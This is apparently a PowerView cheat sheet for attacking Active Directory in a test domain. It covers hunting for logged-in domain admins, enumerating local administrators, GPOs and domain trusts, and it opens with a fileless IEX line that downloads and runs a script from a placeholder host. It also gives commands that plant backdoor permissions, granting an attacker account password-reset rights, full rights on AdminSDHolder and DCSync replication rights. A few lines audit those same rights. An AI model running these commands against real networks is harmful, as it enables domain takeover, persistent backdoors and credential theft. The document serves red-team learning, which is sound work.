
# Import PowerView into memory without touching disk
# IEX (New-Object Net.WebClient).DownloadString('http://HOST/powerview.ps1')


###################################
# Hunting for Users
###################################

# search for administrator groups
Get-NetGroup *admin*

# get all effective members of a group
Get-NetGroupMember DesktopAdmins
Get-NetGroupMember DesktopAdmins -Recurse

# find possibly related domain accounts
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split(' ')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname

# hunt for where domain administrators are logged in
Invoke-UserHunter

# execute 'stealth' hunting, showing all location results
Invoke-UserHunter -Stealth -ShowAll


###################################
# Local Administrator Enumeration
###################################

# retrieve the members of the 'Administrators' local group on WINDOWS2 using the WinNT service provider
([ADSI]'WinNT://DEVELOPMENT/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}

# retrieve more information using Get-NetLocalGroup
Get-NetLocalGroup -ComputerName DEVELOPMENT

# get local group membership with the NetLocalGroupGetMembers API call
Get-NetLocalGroup -ComputerName DEVELOPMENT.testlab.local -API

# retrieve the names of the local groups themselves
Get-NetLocalGroup -ComputerName DEVELOPMENT -ListGroups

# get the list of effective users who can access a target system
Get-NetLocalGroup -ComputerName 192.168.52.202 -Recurse


###################################
# GPO Enumeration and Abuse
###################################

# find the computers a specified user can access

# 1. Resolves a user/group’s SID
# 2. Builds a list SIDs the target is a part of
# 3. Uses Get-NetGPOGroup to pull GPOs that set “Restricted Groups” or groups.xml
# 4. Matches the target SID list to the queried GPO SID list to enumerate all GPOs the target is applied to
# 5. Enumerates all OUs/sites and applicable GPO GUIDs that are applied through GPLink
# 6. Queries for all computers in target OUs/sites
Find-GPOLocation -UserName arobbins.a

# find the users/groups who can administer a given machine
Find-GPOComputerAdmin -ComputerName WINDOWS2.testlab.local

# return all RAW GPO user/group admin results
Get-NetGPOGroup


###################################
# Active Directory ACLs
###################################

# enumerate the AD ACLs for a given user, resolving GUIDs
Get-ObjectACL -ResolveGUIDs -SamAccountName arobbins

# add a backdoored ACL for this user
Add-ObjectACL -TargetSamAccountName arobbins -PrincipalSamAccountName harmj0y -Rights ResetPassword
Get-ObjectACL -ResolveGUIDs -SamAccountName arobbins

# backdoor the permissions for AdminSDHolder
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName harmj0y -Verbose -Rights All

# audit the ACL rights for AdminSDHolder
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'harmj0y'}

# backdoor the rights for DCSync
Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName harmj0y -Rights DCSync

# audit users who have DCSync rights
Get-ObjectACL -DistinguishedName "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# audit GPO permissions
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty'}

# scan for "non-standard" ACL permission sets
Invoke-ACLScanner



###################################
# Domain Trusts
###################################

# enumerate all domains in the current forest
Get-NetForestDomain

# enumerate all current domain trusts
Get-NetDomainTrust

# enumerate the users across a trust
Get-NetUser -Domain dev.testlab.local
# find admin groups across a trust
Get-NetGroup *admin* -Domain dev.testlab.local

# map all reachable domain trusts
Invoke-MapDomainTrust

# map all reachable domain trusts through LDAP queries reflected through the current primary domain controller
Invoke-MapDomainTrust -LDAP

# export domain trust mappings for visualization
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
#     show visualization of example data in yED


# find users in the current domain that reside in groups across a trust
#    i.e. a domain's "outgoing" access
Find-ForeignUser

# find groups in a remote domain that include users not in the target domain
#    i.e. a domain's "incoming" access
Find-ForeignGroup -Domain dev.testlab.local
